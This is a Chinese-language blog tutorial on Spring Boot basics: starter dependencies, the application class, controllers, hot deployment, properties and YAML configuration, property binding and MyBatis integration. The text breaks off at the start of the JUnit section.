<h2 id="1-入门案例"><a href="#1-入门案例" class="headerlink" title="1. 入门案例"></a>1. 入门案例</h2><p>创建基本的maven工程</p>
<h3 id="1-1-添加SpringBoot的起步依赖"><a href="#1-1-添加SpringBoot的起步依赖" class="headerlink" title="1.1 添加SpringBoot的起步依赖"></a>1.1 添加SpringBoot的起步依赖</h3><p>SpringBoot要求，项目要继承SpringBoot的起步依赖spring-boot-starter-parent</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">parent</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-parent<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.0.1.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">parent</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>SpringBoot要集成SpringMVC进行Controller的开发，所以项目要导入web的启动依赖</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure>



<h3 id="1-2-编写SpringBoot引导类"><a href="#1-2-编写SpringBoot引导类" class="headerlink" title="1.2 编写SpringBoot引导类"></a>1.2 编写SpringBoot引导类</h3><p>要通过SpringBoot提供的引导类起步SpringBoot才可以进行访问</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.shadowflow;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.SpringApplication;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.autoconfigure.SpringBootApplication;</span><br><span class="line"></span><br><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MySpringBootApplication</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        SpringApplication.run(MySpringBootApplication.class);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li><code>@SpringBootApplication</code>：标注SpringBoot的启动类，该注解具备多种功能（后面详细剖析）</li>
<li><code>SpringApplication.run(MySpringBootApplication.class) </code>代表运行SpringBoot的启动类，参数为SpringBoot启动类的字节码对象</li>
</ul>
<p>点击启动，访问8080端口有如下页面</p>
<p><img src="../images/pics/java/32.jpg"> </p>
<h3 id="1-3-编写Controller"><a href="#1-3-编写Controller" class="headerlink" title="1.3 编写Controller"></a>1.3 编写Controller</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.shadowflow.controller;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">QuickController</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/quick&quot;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">quick</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;hello springboot&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>访问<a href="http://localhost:8080/quick">http://localhost:8080/quick</a></p>
<p><img src="../images/pics/java/34.jpg">  </p>
<h2 id="2-SpringBoot的热部署"><a href="#2-SpringBoot的热部署" class="headerlink" title="2. SpringBoot的热部署"></a>2. SpringBoot的热部署</h2><p>我们在开发中反复修改类、页面等资源，每次修改后都是需要重新启动才生效，这样每次启动都很麻烦，浪费了大量的时间，我们可以在修改代码后不重启就能生效，在 pom.xml 中添加如下配置就可以实现这样的功能，我们称之为热部署。</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--热部署配置--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-devtools<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><u>这时候我们修改，如果不重启并不会生效，这是IDEA的问题</u>，需要我们设置</p>
<p>1.打开IDEA的设置做如下修改</p>
<p><img src="../images/pics/java/35.jpg"></p>
<ol start="2">
<li>mac上快捷键：Command + Shift + A，搜索Registry</li>
</ol>
<p><img src="../images/pics/java/36.jpg"></p>
<p>2021后的版本在设置里面</p>
<p><img src="../images/pics/java/37.jpg"></p>
<p>这样，修改文件就会重新部署，但是比较慢，耗费性能，我自己用就关了。</p>
<h2 id="3-使用idea快速创建SpringBoot项目"><a href="#3-使用idea快速创建SpringBoot项目" class="headerlink" title="3. 使用idea快速创建SpringBoot项目"></a>3. 使用idea快速创建SpringBoot项目</h2><p>创建新的模块</p>
<p><img src="../images/pics/java/38.jpg"></p>
<p><img src="../images/pics/java/39.jpg"></p>
<h2 id="4-SpringBoot的配置文件"><a href="#4-SpringBoot的配置文件" class="headerlink" title="4. SpringBoot的配置文件"></a>4. SpringBoot的配置文件</h2><p>SpringBoot是基于约定的，所以很多配置都有默认值，但如果想使用自己的配置替换默认配置的话，就可以使用application.properties或者application.yml（application.yaml）进行配置。</p>
<p>SpringBoot默认会从Resources目录下加载application.properties或application.yml（application.yaml）文件</p>
<p>其中，application.properties文件是键值对类型的文件</p>
<h3 id="4-1-properties举例"><a href="#4-1-properties举例" class="headerlink" title="4.1 properties举例"></a>4.1 properties举例</h3><figure class="highlight properties"><table><tr><td class="code"><pre><span class="line"><span class="comment">#服务器端口</span></span><br><span class="line"><span class="meta">server.port</span>=<span class="string">8081</span></span><br><span class="line"><span class="comment">#当前web应用的名称</span></span><br><span class="line"><span class="meta">server.servlet.context-path</span>=<span class="string">/demo</span></span><br></pre></td></tr></table></figure>

<h3 id="4-2-yaml"><a href="#4-2-yaml" class="headerlink" title="4.2 yaml"></a>4.2 yaml</h3><p>YML文件格式是YAML (YAML Aint Markup Language)编写的文件格式，YAML是一种直观的能够被电脑识别的的数据数据序列化格式，并且容易被人类阅读，容易和脚本语言交互的，可以被支持YAML库的不同的编程语言程序导入，比如： C/C++, Ruby, Python, Java, Perl, C#, PHP等。YML文件是以数据为核心的，比传统的xml方式更加简洁。</p>
<p>YML文件的扩展名可以使用.yml或者.yaml。</p>
<h3 id="4-3-yml配置文件的语法"><a href="#4-3-yml配置文件的语法" class="headerlink" title="4.3 yml配置文件的语法"></a>4.3 yml配置文件的语法</h3><p><strong>配置普通数据</strong></p>
<ul>
<li><p>语法： key: value</p>
</li>
<li><p>示例代码：</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">name:</span> <span class="string">haohao</span></span><br></pre></td></tr></table></figure></li>
<li><p>注意：value之前有一个空格</p>
</li>
</ul>
<p><strong>配置对象数据</strong></p>
<ul>
<li><p>语法： </p>
<p>​    key: </p>
<p>​        key1: value1</p>
<p>​        key2: value2</p>
<p>​    或者：</p>
<p>​    key: {key1: value1,key2: value2}</p>
</li>
<li><p>示例代码：</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">person:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">haohao</span></span><br><span class="line">  <span class="attr">age:</span> <span class="number">31</span></span><br><span class="line">  <span class="attr">addr:</span> <span class="string">beijing</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#或者</span></span><br><span class="line"></span><br><span class="line"><span class="attr">person:</span> &#123;<span class="attr">name:</span> <span class="string">haohao</span>,<span class="attr">age:</span> <span class="number">31</span>,<span class="attr">addr:</span> <span class="string">beijing</span>&#125;</span><br></pre></td></tr></table></figure></li>
<li><p>注意：key1前面的空格个数不限定，在yml语法中，相同缩进代表同一个级别</p>
</li>
</ul>
<p>**配置Map数据 **</p>
<p>同上面的对象写法</p>
<p><strong>配置数组（List、Set）数据</strong></p>
<ul>
<li><p>语法： </p>
<p>​    key: </p>
<p>​        - value1</p>
<p>​        - value2</p>
<p>或者：</p>
<p>​    key: [value1,value2]</p>
</li>
<li><p>示例代码：</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">city:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">beijing</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">tianjin</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">shanghai</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">chongqing</span></span><br><span class="line">  </span><br><span class="line"><span class="comment">#或者</span></span><br><span class="line"></span><br><span class="line"><span class="attr">city:</span> [<span class="string">beijing</span>,<span class="string">tianjin</span>,<span class="string">shanghai</span>,<span class="string">chongqing</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#集合中的元素是对象形式</span></span><br><span class="line"><span class="attr">student:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">zhangsan</span></span><br><span class="line">    <span class="attr">age:</span> <span class="number">18</span></span><br><span class="line">    <span class="attr">score:</span> <span class="number">100</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">lisi</span></span><br><span class="line">    <span class="attr">age:</span> <span class="number">28</span></span><br><span class="line">    <span class="attr">score:</span> <span class="number">88</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">wangwu</span></span><br><span class="line">    <span class="attr">age:</span> <span class="number">38</span></span><br><span class="line">    <span class="attr">score:</span> <span class="number">90</span></span><br></pre></td></tr></table></figure>

<ul>
<li>注意：value1与之间的 - 之间存在一个空格</li>
</ul>
</li>
</ul>
<h3 id="4-4-SpringBoot配置信息的查询"><a href="#4-4-SpringBoot配置信息的查询" class="headerlink" title="4.4 SpringBoot配置信息的查询"></a>4.4 SpringBoot配置信息的查询</h3><p>面提及过，SpringBoot的配置文件，主要的目的就是对配置信息进行修改的，但在配置时的key从哪里去查询呢？我们可以查阅SpringBoot的官方文档</p>
<p>文档URL：<a href="https://docs.spring.io/spring-boot/docs/2.0.1.RELEASE/reference/htmlsingle/#common-application-properties">https://docs.spring.io/spring-boot/docs/2.0.1.RELEASE/reference/htmlsingle/#common-application-properties</a></p>
<p>常用的配置摘抄如下：</p>
<figure class="highlight properties"><table><tr><td class="code"><pre><span class="line"><span class="comment"># QUARTZ SCHEDULER (QuartzProperties)</span></span><br><span class="line"><span class="meta">spring.quartz.jdbc.initialize-schema</span>=<span class="string">embedded # Database schema initialization mode.</span></span><br><span class="line"><span class="meta">spring.quartz.jdbc.schema</span>=<span class="string">classpath:org/quartz/impl/jdbcjobstore/tables_@@platform@@.sql # Path to the SQL file to use to initialize the database schema.</span></span><br><span class="line"><span class="meta">spring.quartz.job-store-type</span>=<span class="string">memory # Quartz job store type.</span></span><br><span class="line"><span class="meta">spring.quartz.properties.*</span>= <span class="string"># Additional Quartz Scheduler properties.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"># ----------------------------------------</span></span><br><span class="line"><span class="comment"># WEB PROPERTIES</span></span><br><span class="line"><span class="comment"># ----------------------------------------</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"># EMBEDDED SERVER CONFIGURATION (ServerProperties)</span></span><br><span class="line"><span class="meta">server.port</span>=<span class="string">8080 # Server HTTP port.</span></span><br><span class="line"><span class="meta">server.servlet.context-path</span>= <span class="string"># Context path of the application.</span></span><br><span class="line"><span class="meta">server.servlet.path</span>=<span class="string">/ # Path of the main dispatcher servlet.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"># HTTP encoding (HttpEncodingProperties)</span></span><br><span class="line"><span class="meta">spring.http.encoding.charset</span>=<span class="string">UTF-8 # Charset of HTTP requests and responses. Added to the &quot;Content-Type&quot; header if not set explicitly.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"># JACKSON (JacksonProperties)</span></span><br><span class="line"><span class="meta">spring.jackson.date-format</span>= <span class="string"># Date format string or a fully-qualified date format class name. For instance, `yyyy-MM-dd HH:mm:ss`.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"># SPRING MVC (WebMvcProperties)</span></span><br><span class="line"><span class="meta">spring.mvc.servlet.load-on-startup</span>=<span class="string">-1 # Load on startup priority of the dispatcher servlet.</span></span><br><span class="line"><span class="meta">spring.mvc.static-path-pattern</span>=<span class="string">/** # Path pattern used for static resources.</span></span><br><span class="line"><span class="meta">spring.mvc.view.prefix</span>= <span class="string"># Spring MVC view prefix.</span></span><br><span class="line"><span class="meta">spring.mvc.view.suffix</span>= <span class="string"># Spring MVC view suffix.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"># DATASOURCE (DataSourceAutoConfiguration &amp; DataSourceProperties)</span></span><br><span class="line"><span class="meta">spring.datasource.driver-class-name</span>= <span class="string"># Fully qualified name of the JDBC driver. Auto-detected based on the URL by default.</span></span><br><span class="line"><span class="meta">spring.datasource.password</span>= <span class="string"># Login password of the database.</span></span><br><span class="line"><span class="meta">spring.datasource.url</span>= <span class="string"># JDBC URL of the database.</span></span><br><span class="line"><span class="meta">spring.datasource.username</span>= <span class="string"># Login username of the database.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"># JEST (Elasticsearch HTTP client) (JestProperties)</span></span><br><span class="line"><span class="meta">spring.elasticsearch.jest.password</span>= <span class="string"># Login password.</span></span><br><span class="line"><span class="meta">spring.elasticsearch.jest.proxy.host</span>= <span class="string"># Proxy host the HTTP client should use.</span></span><br><span class="line"><span class="meta">spring.elasticsearch.jest.proxy.port</span>= <span class="string"># Proxy port the HTTP client should use.</span></span><br><span class="line"><span class="meta">spring.elasticsearch.jest.read-timeout</span>=<span class="string">3s # Read timeout.</span></span><br><span class="line"><span class="meta">spring.elasticsearch.jest.username</span>= <span class="string"># Login username.</span></span><br></pre></td></tr></table></figure>

<p>我们可以通过配置application.poperties 或者 application.yml 来修改SpringBoot的默认配置</p>
<p>例如：</p>
<p>application.properties文件</p>
<figure class="highlight properties"><table><tr><td class="code"><pre><span class="line"><span class="meta">server.port</span>=<span class="string">8888</span></span><br><span class="line"><span class="meta">server.servlet.context-path</span>=<span class="string">demo</span></span><br></pre></td></tr></table></figure>

<p>application.yml文件</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">8888</span></span><br><span class="line">  <span class="attr">servlet:</span></span><br><span class="line">    <span class="attr">context-path:</span> <span class="string">/demo</span></span><br></pre></td></tr></table></figure>



<h3 id="4-5-配置文件与配置类的属性映射方式"><a href="#4-5-配置文件与配置类的属性映射方式" class="headerlink" title="4.5 配置文件与配置类的属性映射方式"></a>4.5 配置文件与配置类的属性映射方式</h3><p><strong>使用注解@Value映射</strong></p>
<p>我们可以通过@Value注解将配置文件中的值映射到一个Spring管理的Bean的字段上</p>
<p>例如：</p>
<p>application.properties配置如下：</p>
<figure class="highlight properties"><table><tr><td class="code"><pre><span class="line"><span class="attr">person</span>:<span class="string"></span></span><br><span class="line">  <span class="attr">name</span>: <span class="string">zhangsan</span></span><br><span class="line">  <span class="attr">age</span>: <span class="string">18</span></span><br></pre></td></tr></table></figure>

<p>或者，application.yml配置如下：</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">person:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">zhangsan</span></span><br><span class="line">  <span class="attr">age:</span> <span class="number">18</span></span><br></pre></td></tr></table></figure>

<p>实体Bean代码如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">QuickStartController</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Value(&quot;$&#123;person.name&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="meta">@Value(&quot;$&#123;person.age&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> Integer age;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/quick&quot;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">quick</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;springboot 访问成功! name=&quot;</span>+name+<span class="string">&quot;,age=&quot;</span>+age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>使用注解@ConfigurationProperties映射</strong></p>
<p>通过注解@ConfigurationProperties(prefix=”配置文件中的key的前缀”)可以将配置文件中的配置自动与实体进行映射</p>
<p>application.properties配置如下：</p>
<figure class="highlight properties"><table><tr><td class="code"><pre><span class="line"><span class="attr">person</span>:<span class="string"></span></span><br><span class="line">  <span class="attr">name</span>: <span class="string">zhangsan</span></span><br><span class="line">  <span class="attr">age</span>: <span class="string">18</span></span><br></pre></td></tr></table></figure>

<p>或者，application.yml配置如下：</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">person:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">zhangsan</span></span><br><span class="line">  <span class="attr">age:</span> <span class="number">18</span></span><br></pre></td></tr></table></figure>

<p>实体Bean代码如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="meta">@ConfigurationProperties(prefix = &quot;person&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">QuickStartController</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> Integer age;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/quick&quot;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">quick</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;springboot 访问成功! name=&quot;</span>+name+<span class="string">&quot;,age=&quot;</span>+age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAge</span><span class="params">(Integer age)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>注意：使用@ConfigurationProperties方式可以进行配置文件与实体字段的自动映射，但需要字段必须提供set方法才可以，而使用@Value注解修饰的字段不需要提供set方法。</p>
<h2 id="5-SpringBoot整合"><a href="#5-SpringBoot整合" class="headerlink" title="5. SpringBoot整合"></a>5. SpringBoot整合</h2><h3 id="5-1-SpringBoot整合Mybatis"><a href="#5-1-SpringBoot整合Mybatis" class="headerlink" title="5.1 SpringBoot整合Mybatis"></a>5.1 SpringBoot整合Mybatis</h3><ul>
<li><p>添加Mybatis的起步依赖</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--mybatis起步依赖--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.mybatis.spring.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mybatis-spring-boot-starter<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.1.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
<li><p>添加数据库驱动坐标</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- MySQL连接驱动 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>mysql<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mysql-connector-java<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
<li><p>添加数据库连接信息</p>
<p>在application.properties中添加数据量的连接信息</p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="comment">#DB Configuration:</span></span><br><span class="line"><span class="attr">spring.datasource.driverClassName</span>=com.mysql.jdbc.Driver</span><br><span class="line"><span class="attr">spring.datasource.url</span>=jdbc:mysql://<span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">3306</span>/test?useUnicode=<span class="literal">true</span>&amp;characterEncoding=utf8</span><br><span class="line"><span class="attr">spring.datasource.username</span>=root</span><br><span class="line"><span class="attr">spring.datasource.password</span>=root</span><br></pre></td></tr></table></figure></li>
<li><p>创建user表</p>
<p>在test数据库中创建user表</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- ----------------------------</span></span><br><span class="line"><span class="comment">-- Table structure for `user`</span></span><br><span class="line"><span class="comment">-- ----------------------------</span></span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">TABLE</span> IF <span class="keyword">EXISTS</span> `<span class="keyword">user</span>`;</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> `<span class="keyword">user</span>` (</span><br><span class="line">  `id` <span class="type">int</span>(<span class="number">11</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> AUTO_INCREMENT,</span><br><span class="line">  `username` <span class="type">varchar</span>(<span class="number">50</span>) <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span>,</span><br><span class="line">  `password` <span class="type">varchar</span>(<span class="number">50</span>) <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span>,</span><br><span class="line">  `name` <span class="type">varchar</span>(<span class="number">50</span>) <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span>,</span><br><span class="line">  <span class="keyword">PRIMARY</span> KEY (`id`)</span><br><span class="line">) ENGINE<span class="operator">=</span>InnoDB AUTO_INCREMENT<span class="operator">=</span><span class="number">10</span> <span class="keyword">DEFAULT</span> CHARSET<span class="operator">=</span>utf8;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- ----------------------------</span></span><br><span class="line"><span class="comment">-- Records of user</span></span><br><span class="line"><span class="comment">-- ----------------------------</span></span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> `<span class="keyword">user</span>` <span class="keyword">VALUES</span> (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;zhangsan&#x27;</span>, <span class="string">&#x27;123&#x27;</span>, <span class="string">&#x27;张三&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> `<span class="keyword">user</span>` <span class="keyword">VALUES</span> (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;lisi&#x27;</span>, <span class="string">&#x27;123&#x27;</span>, <span class="string">&#x27;李四&#x27;</span>);</span><br></pre></td></tr></table></figure></li>
<li><p>创建实体Bean</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 主键</span></span><br><span class="line">    <span class="keyword">private</span> Long id;</span><br><span class="line">    <span class="comment">// 用户名</span></span><br><span class="line">    <span class="keyword">private</span> String username;</span><br><span class="line">    <span class="comment">// 密码</span></span><br><span class="line">    <span class="keyword">private</span> String password;</span><br><span class="line">    <span class="comment">// 姓名</span></span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">  </span><br><span class="line">    <span class="comment">//此处省略getter和setter方法 .. ..</span></span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li><p>编写Mapper</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Mapper</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">UserMapper</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> List&lt;User&gt; <span class="title">queryUserList</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>注意：@Mapper标记该类是一个mybatis的mapper接口，可以被spring boot自动扫描到spring上下文中</p>
</li>
<li><p>配置Mapper映射文件</p>
<p>在src\main\resources\mapper路径下加入UserMapper.xml配置文件”</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot; ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">mapper</span> <span class="meta-keyword">PUBLIC</span> <span class="meta-string">&quot;-//mybatis.org//DTD Mapper 3.0//EN&quot;</span> <span class="meta-string">&quot;http://mybatis.org/dtd/mybatis-3-mapper.dtd&quot;</span> &gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">mapper</span> <span class="attr">namespace</span>=<span class="string">&quot;com.itheima.mapper.UserMapper&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;queryUserList&quot;</span> <span class="attr">resultType</span>=<span class="string">&quot;user&quot;</span>&gt;</span></span><br><span class="line">        select * from user</span><br><span class="line">    <span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">mapper</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
<li><p>在application.properties中添加mybatis的信息</p>
<figure class="highlight properties"><table><tr><td class="code"><pre><span class="line"><span class="comment">#spring集成Mybatis环境</span></span><br><span class="line"><span class="comment">#pojo别名扫描包</span></span><br><span class="line"><span class="meta">mybatis.type-aliases-package</span>=<span class="string">com.itheima.domain</span></span><br><span class="line"><span class="comment">#加载Mybatis映射文件</span></span><br><span class="line"><span class="meta">mybatis.mapper-locations</span>=<span class="string">classpath:mapper/*Mapper.xml</span></span><br></pre></td></tr></table></figure></li>
<li><p>编写测试Controller</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MapperController</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> UserMapper userMapper;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/queryUser&quot;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;User&gt; <span class="title">queryUser</span><span class="params">()</span></span>&#123;</span><br><span class="line">        List&lt;User&gt; users = userMapper.queryUserList();</span><br><span class="line">        <span class="keyword">return</span> users;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="5-2-SpringBoot整合Junit"><a href="#5-2-SpringBoot整合Junit" class="headerlink" title="5.2 SpringBoot整合Junit"></a>5.2 SpringBoot整合Junit</h3><ul>
<li><p>添加Junit的起步依赖</p>
